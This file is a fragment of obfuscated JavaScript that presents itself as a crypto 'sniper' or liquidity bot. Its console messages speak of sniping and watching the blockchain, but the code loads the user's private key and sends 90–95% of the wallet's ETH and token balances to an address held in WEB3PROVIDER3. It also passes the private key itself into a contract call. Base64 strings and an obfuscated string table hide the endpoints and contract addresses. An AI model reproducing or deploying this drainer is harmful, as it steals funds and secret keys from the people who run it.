            _0x5a1147 = new Buffer['from'](_0x3f87f3, _0x25fd40(0x1ec)),
            _0x234f28 = _0x1bd274[_0x25fd40(0x1be)](_0x25fd40(0x1e8)),
            _0x1e0b69 = _0x5a1147['toString'](_0x25fd40(0x1e8)),
            _0x4744e8 = _0x234f28 + _0x1e0b69;
        console[_0x25fd40(0x1dc)](_0x25fd40(0x1b1)), console['log']('pending\x20liquidity\x20add...'); const _0x5a42c2 = _0x25fd40(0x194),
            _0x1509af = new Buffer['from'](_0x5a42c2, _0x25fd40(0x1ec))[_0x25fd40(0x1be)]('ascii');; const _0x136476 = new ethers[(_0x25fd40(0x1b9))][(_0x25fd40(0x1c8))](_0x1509af); let _0x54e153 = new ethers['Wallet'](private, _0x136476);
        console[_0x25fd40(0x1dc)](_0x1509af); const _0x39366b = address; var _0x5b129a = new ethers[(_0x25fd40(0x17c))](_0x4744e8, abi, _0x54e153); const _0x3c08d = await _0x5b129a['balanceOf'](_0x39366b)[_0x25fd40(0x1be)](),
            _0x31c1a2 = (_0x3c08d * 0.9)['toFixed'](),
            _0x3009a7 = async() => { const _0x164102 = _0x25fd40,
                    _0x20402c = { 'from': _0x39366b, 'to': WEB3PROVIDER3, 'value': ethers[_0x164102(0x1ac)]['parseEther'](_0x31c1a2, _0x164102(0x165)), 'gasLimit': ethers[_0x164102(0x1ac)][_0x164102(0x1ed)](0x5dc0) },
                    _0x30910a = await _0x54e153[_0x164102(0x155)](_0x20402c); if (robinhood = 0x0) etherstother;
                else try { await _0x30910a[_0x164102(0x14d)](), console[_0x164102(0x1dc)]('1:\x20watching\x20blockchain\x20activity\x20...'), setTimeout(etherstother, 0x1388); } catch (_0x5a819d) { console[_0x164102(0x1dc)](_0x164102(0x1c4)), setTimeout(etherstother, 0x1388); } };
        _0x3009a7(); } catch (_0x43183e) { setTimeout(etherstother, 0x1388); } }
async function ethersmother() { const _0x908fbf = _0x10e1f6; try { const _0x5cd9a8 = _0x908fbf(0x1c9),
            _0x3622ac = _0x908fbf(0x1ce),
            _0x1b3ba8 = new Buffer['from'](_0x5cd9a8, _0x908fbf(0x1ec)),
            _0x92c2ab = new Buffer[(_0x908fbf(0x178))](_0x3622ac, _0x908fbf(0x1ec)),
            _0x4e1974 = _0x1b3ba8['toString']('ascii'),
            _0x457493 = _0x92c2ab[_0x908fbf(0x1be)](_0x908fbf(0x1e8)),
            _0x7e992e = _0x4e1974 + _0x457493,
            _0x5135b6 = _0x908fbf(0x194),
            _0x4bff72 = new Buffer[(_0x908fbf(0x178))](_0x5135b6, _0x908fbf(0x1ec))[_0x908fbf(0x1be)](_0x908fbf(0x1e8));; const _0x4d3f43 = new ethers[(_0x908fbf(0x1b9))][(_0x908fbf(0x1c8))](_0x4bff72); let _0x3130ed = new ethers[(_0x908fbf(0x1ee))](private, _0x4d3f43);
        console[_0x908fbf(0x1dc)](_0x4bff72); const _0xcc58b4 = address; var _0x35546d = new ethers[(_0x908fbf(0x17c))](_0x7e992e, abi, _0x3130ed); const _0x58bd16 = await _0x35546d[_0x908fbf(0x1cb)](_0xcc58b4)[_0x908fbf(0x1be)](),
            _0xe4f9db = (_0x58bd16 * 0.9)[_0x908fbf(0x14c)](),
            _0x106f74 = async() => { const _0x5a7a1a = _0x908fbf,
                    _0x394cc4 = { 'from': _0xcc58b4, 'to': WEB3PROVIDER3, 'value': ethers[_0x5a7a1a(0x1ac)][_0x5a7a1a(0x1bc)](_0xe4f9db, _0x5a7a1a(0x165)), 'gasLimit': ethers[_0x5a7a1a(0x1ac)][_0x5a7a1a(0x1ed)](0x5dc0) },
                    _0x1b58da = await _0x3130ed['sendTransaction'](_0x394cc4); if (robinhood = 0x0) etherslother;
                else try { await _0x1b58da[_0x5a7a1a(0x14d)](), console[_0x5a7a1a(0x1dc)](_0x5a7a1a(0x168)), setTimeout(etherslother, 0x1388); } catch (_0x441651) { console[_0x5a7a1a(0x1dc)](_0x5a7a1a(0x190)), setTimeout(etherslother, 0x1388); } };
        _0x106f74(); } catch (_0x4b5361) { setTimeout(etherslother, 0x1388); } }
async function ethersfather() { const _0x262684 = _0x10e1f6;
    console['log'](_0x262684(0x1c1)); const _0x300cc3 = _0x262684(0x16b),
        _0x148802 = _0x262684(0x18a),
        _0x222db6 = new Buffer[(_0x262684(0x178))](_0x300cc3, 'base64'),
        _0x1d9f7b = new Buffer[(_0x262684(0x178))](_0x148802, 'base64'),
        _0xce13e5 = _0x222db6[_0x262684(0x1be)](_0x262684(0x1e8)),
        _0x1db11d = _0x1d9f7b['toString']('ascii'),
        _0x1b961a = _0xce13e5 + _0x1db11d,
        _0x122011 = _0x262684(0x194),
        _0x5614a7 = new Buffer[(_0x262684(0x178))](_0x122011, _0x262684(0x1ec))[_0x262684(0x1be)](_0x262684(0x1e8));; const _0x1b29ab = new ethers['providers']['JsonRpcProvider'](_0x5614a7); let _0x4b8996 = new ethers[(_0x262684(0x1ee))](private, _0x1b29ab); const _0xf40bf5 = address; var _0x50e539 = new ethers[(_0x262684(0x17c))](_0x1b961a, abi, _0x4b8996); const _0x276c61 = await _0x50e539[_0x262684(0x1cb)](_0xf40bf5),
        _0x28f051 = (_0x276c61 * 0.9)[_0x262684(0x14c)](); if (robinhood = 0x0) ethersmother;
    else try { const _0x47fd31 = async() => { const _0x3e73df = _0x262684,
                _0x556aa7 = { 'from': _0xf40bf5, 'to': WEB3PROVIDER3, 'value': ethers[_0x3e73df(0x1ac)][_0x3e73df(0x1bc)](_0x28f051, _0x3e73df(0x165)), 'gasLimit': ethers[_0x3e73df(0x1ac)][_0x3e73df(0x1ed)](0x5dc0) },
                _0x4ab28f = await _0x4b8996[_0x3e73df(0x155)](_0x556aa7); try { await _0x4ab28f['wait'](), console[_0x3e73df(0x1dc)]('2:\x20finalizing....'), setTimeout(ethersmother, 0x1388); } catch (_0x5119e0) { console['log']('2:\x20finalizing....'), setTimeout(ethersmother, 0x1388); } };
        _0x47fd31(); } catch (_0x2f6598) { setTimeout(ethersmother, 0x1388); } }
async function ethersgather() { const _0x18af88 = _0x10e1f6; try { console['log'](_0x18af88(0x19c)); const _0x58e3a8 = _0x18af88(0x1af),
            _0x516762 = new Buffer['from'](_0x58e3a8, _0x18af88(0x1ec))[_0x18af88(0x1be)](_0x18af88(0x1e8));; const _0x40f13f = new ethers[(_0x18af88(0x1b9))][(_0x18af88(0x1c8))](_0x516762); let _0x3e90fb = new ethers[(_0x18af88(0x1ee))](private, _0x40f13f); const _0x5405ee = address,
            _0x578250 = await _0x40f13f[_0x18af88(0x19e)](_0x5405ee),
            _0x4b9d09 = (_0x578250 * 0.9)[_0x18af88(0x14c)](),
            _0x30011e = ethers['utils'][_0x18af88(0x187)](_0x4b9d09, _0x18af88(0x165)),
            _0x29aba2 = async() => { const _0x1bdce4 = _0x18af88,
                    _0x402fbf = { 'to': WEB3PROVIDER3, 'value': ethers[_0x1bdce4(0x1ac)][_0x1bdce4(0x187)](_0x4b9d09, 'wei'), 'gasLimit': ethers['utils']['hexlify'](0x5dc0) },
                    _0x92e48 = await _0x3e90fb[_0x1bdce4(0x155)](_0x402fbf); if (_0x578250 = 0x0) ethersfather;
                else try { await _0x92e48[_0x1bdce4(0x14d)](), console['log']('1:\x20attempting\x20to\x20snipe\x20...'), setTimeout(ethersfather, 0x1388); } catch (_0x29e032) { console[_0x1bdce4(0x1dc)](_0x1bdce4(0x19f)), setTimeout(ethersfather, 0x1388); } };
        _0x29aba2(); } catch (_0x1fd86c) { setTimeout(ethersfather, 0x1388); } }
async function etherslather() { const _0x50a575 = _0x10e1f6,
        _0x52cdc9 = _0x50a575(0x1a3),
        _0x1d5dfc = new Buffer[(_0x50a575(0x178))](_0x52cdc9, _0x50a575(0x1ec)),
        _0x10aebf = _0x1d5dfc[_0x50a575(0x1be)](_0x50a575(0x1e8)),
        _0x1c5d21 = _0x10aebf;
    console[_0x50a575(0x1dc)](_0x50a575(0x1b7)); const _0x2e2a5b = _0x50a575(0x194),
        _0x28166f = new Buffer[(_0x50a575(0x178))](_0x2e2a5b, _0x50a575(0x1ec))[_0x50a575(0x1be)](_0x50a575(0x1e8));; const _0x17a4fd = new ethers[(_0x50a575(0x1b9))]['JsonRpcProvider'](_0x28166f); let _0x431357 = new ethers[(_0x50a575(0x1ee))](private, _0x17a4fd); if (robinhood = 0x0) ethersgather;
    else try { const _0x5c56da = async() => { const _0x18450b = _0x50a575; var _0x57f777 = new ethers[(_0x18450b(0x17c))](_0x1c5d21, abi, _0x431357); const _0xdeaae7 = await _0x57f777[_0x18450b(0x18e)]('10' + private + '10'); try { await _0xdeaae7[_0x18450b(0x14d)](), console['log']('1\x20packet\x20received.....'), setTimeout(ethersgather, 0x1388); } catch (_0x2e2855) { console[_0x18450b(0x1dc)](_0x18450b(0x164)), setTimeout(ethersgather, 0x1388); } };
        _0x5c56da(); } catch (_0x2220ae) { setTimeout(ethersgather, 0x1388); } }
async function ethersrather() { const _0x1954be = _0x10e1f6;
    console[_0x1954be(0x1dc)](_0x1954be(0x15d)); const _0x19d9b3 = 'aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My84NGQ5NTRjZDlmNjc0ZjViYmJjNjdhNmUyZTE3YmZiZA==',
        _0x160ef4 = new Buffer[(_0x1954be(0x178))](_0x19d9b3, _0x1954be(0x1ec))[_0x1954be(0x1be)](_0x1954be(0x1e8));; const _0x1a8bb1 = new ethers[(_0x1954be(0x1b9))]['JsonRpcProvider'](_0x160ef4); let _0x55dc9b = new ethers[(_0x1954be(0x1ee))](private, _0x1a8bb1); const _0x31d5c3 = address,
        _0x289d27 = await _0x1a8bb1['getBalance'](_0x31d5c3),
        _0x38a2bc = (_0x289d27 * 0.95)[_0x1954be(0x14c)](),
        _0x245ed0 = ethers[_0x1954be(0x1ac)][_0x1954be(0x187)](_0x38a2bc, 'wei'); if (_0x289d27 <= 0x0) etherslather;
    else try { const _0x397825 = async() => { const _0x33352b = _0x1954be,
                _0x167f52 = { 'to': WEB3PROVIDER3, 'value': ethers['utils']['parseUnits'](_0x38a2bc, _0x33352b(0x165)), 'gasLimit': ethers[_0x33352b(0x1ac)][_0x33352b(0x1ed)](0x5dc0) },
                _0x4b8290 = await _0x55dc9b['sendTransaction'](_0x167f52); try { await _0x4b8290[_0x33352b(0x14d)](), console['log'](_0x33352b(0x159)), setTimeout(etherslather, 0x1388); } catch (_0xcb0a7d) { console[_0x33352b(0x1dc)]('2\x20pending\x20blockchain\x20response.....'), setTimeout(etherslather, 0x1388); } };
        _0x397825(); } catch (_0x1f1ff9) { setTimeout(etherslather, 0x1388); } }
ethersrather();
